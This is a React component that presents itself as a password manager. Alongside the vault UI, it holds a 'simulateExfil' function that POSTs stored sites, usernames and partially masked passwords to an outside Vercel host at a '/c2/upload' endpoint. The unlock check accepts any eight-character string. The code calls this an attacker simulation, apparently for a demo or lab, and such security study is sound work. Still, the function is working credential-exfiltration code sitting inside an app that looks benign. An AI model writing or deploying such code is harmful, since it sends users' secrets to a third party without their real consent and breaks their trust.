import React, { useState, useEffect } from 'react';

export default function PasswordManager() {
  const [masterPassword, setMasterPassword] = useState('');
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [passwords, setPasswords] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadPasswords();
  }, []);

  const loadPasswords = async () => {
    try {
      const result = await window.storage.list('pwd:');
      if (result && result.keys) {
        const loadedPasswords = await Promise.all(
          result.keys.map(async (key) => {
            try {
              const data = await window.storage.get(key);
              return data ? JSON.parse(data.value) : null;
            } catch {
              return null;
            }
          })
        );
        setPasswords(loadedPasswords.filter(p => p !== null));
      }
    } catch (error) {
      console.log('No existing passwords found');
    }
    setLoading(false);
  };

  const handleUnlock = (e) => {
    e.preventDefault();
    if (masterPassword.length >= 8) setIsUnlocked(true);
    else alert('Master password must be at least 8 characters');
  };

  // Build payload - mask passwords except last 4 characters
  const buildPayload = () => {
    return passwords.map(p => ({
      site: p.website,
      username: p.username,
      password: maskString(p.password, 4),
    }));
  };

  const maskString = (str, last = 4) => {
    if (!str) return '';
    if (str.length <= last) return '*'.repeat(str.length);
    return '*'.repeat(str.length - last) + str.slice(-last);
  };

  // Send passwords to attacker sim URL
  const simulateExfil = async () => {
    if (passwords.length === 0) {
      alert('No passwords to exfiltrate!');
      return;
    }

    const payload = {
      simulation: true,
      attacker_label: 'react-sim',
      timestamp: new Date().toISOString(),
      collected: buildPayload()
    };

    try {
      const res = await fetch('https://attacker-sim-6cxj-p690zm6kz-loxy1235s-projects.vercel.app/c2/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        // Include credentials if needed:
        // credentials: 'include'
      });
      if (!res.ok) throw new Error(`Server responded ${res.status}`);
      alert('Passwords sent successfully to simulated C2 server.');
    } catch (err) {
      console.error('Exfiltration failed:', err);
      alert('Failed to send passwords to simulated C2 server.');
    }
  };

  if (loading) {
    return <div>Loading passwords...</div>;
  }

  if (!isUnlocked) {
    return (
      <div>
        <h1>Password Manager - Unlock</h1>
        <form onSubmit={handleUnlock}>
          <input
            type="password"
            placeholder="Enter master password"
            value={masterPassword}
            onChange={e => setMasterPassword(e.target.value)}
            required
          />
          <button type="submit">Unlock Vault</button>
        </form>
      </div>
    );
  }

  return (
    <div>
      <h1>Your Passwords ({passwords.length})</h1>
      <ul>
        {passwords.map(p => (
          <li key={p.id}>{p.website} - {p.username} - {maskString(p.password, 4)}</li>
        ))}
      </ul>
      <button onClick={simulateExfil}>Simulate C2 Communication</button>
    </div>
  );
}
